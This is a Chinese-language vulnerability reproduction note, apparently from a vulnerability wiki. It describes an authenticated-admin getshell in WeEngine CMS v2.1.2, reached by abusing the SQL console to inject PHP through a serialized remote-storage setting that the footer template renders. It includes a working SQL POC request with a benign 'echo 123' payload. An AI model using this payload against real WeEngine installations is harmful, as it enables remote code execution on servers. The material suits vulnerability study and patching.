微擎cms v2.1.2 后台getshell
===========================

一、漏洞简介
------------

需要登录后台，并且有高权限。

二、漏洞影响
------------

v2.1.2

三、复现过程
------------

这个洞首先需要一个高权账号。问题出在模板解析这里(template.func.php)。

![](/Users/aresx/Documents/VulWiki/.resource/微擎cmsv2.1.2后台getshell/media/rId24.png)

attachurl\_remote来自于后台的设置,但是有一层htmlspecialchars

![](/Users/aresx/Documents/VulWiki/.resource/微擎cmsv2.1.2后台getshell/media/rId25.png)

![](/Users/aresx/Documents/VulWiki/.resource/微擎cmsv2.1.2后台getshell/media/rId26.png)

但是恰巧微擎支持SQL操作,虽然有些绿化版本的把SQL提交按钮和TOKEN值隐藏了,但是由于微擎一个页面做了多个CASE,所以可以数据表优化处找到TOKEN

![](/Users/aresx/Documents/VulWiki/.resource/微擎cmsv2.1.2后台getshell/media/rId27.png)

这样就可以愉快的修改SQL了,然后会发现微擎存在一个缓存表,同时remote这边的设置做了序列化(其实这个也可以利用),就可以构造如下

### POC

    sql=DELETE from ims_core_cache;update ims_core_settings  set `value` ='a:5:{s:4:"type";i:1;s:6:"alioss";a:4:{s:3:"key";s:0:"";s:6:"secret";s:0:"";s:6:"bucket";N;s:8:"internal";s:1:"0";}s:3:"ftp";a:9:{s:3:"ssl";i:1;s:4:"host";s:9:"127.0.0.1";s:4:"port";s:2:"21";s:8:"username";s:4:"root";s:8:"password";s:4:"root";s:4:"pasv";i:0;s:3:"dir";s:10:"127.0.0.11";s:3:"url";s:28:"127.0.0.1?<?php echo 123; ?>";s:8:"overtime";i:0;}s:5:"qiniu";a:4:{s:9:"accesskey";s:0:"";s:9:"secretkey";s:0:"";s:6:"bucket";s:0:"";s:3:"url";s:0:"";}s:3:"cos";a:6:{s:5:"appid";s:0:"";s:8:"secretid";s:0:"";s:9:"secretkey";s:0:"";s:6:"bucket";s:0:"";s:5:"local";s:0:"";s:3:"url";s:0:"";}}' where `key`="remote";&token=9def73ec&submit=submit

最后刷新缓存然后打开有加载footer的页面就能getshell了

![](/Users/aresx/Documents/VulWiki/.resource/微擎cmsv2.1.2后台getshell/media/rId29.png)

![](/Users/aresx/Documents/VulWiki/.resource/微擎cmsv2.1.2后台getshell/media/rId30.png)

![](/Users/aresx/Documents/VulWiki/.resource/微擎cmsv2.1.2后台getshell/media/rId31.png)
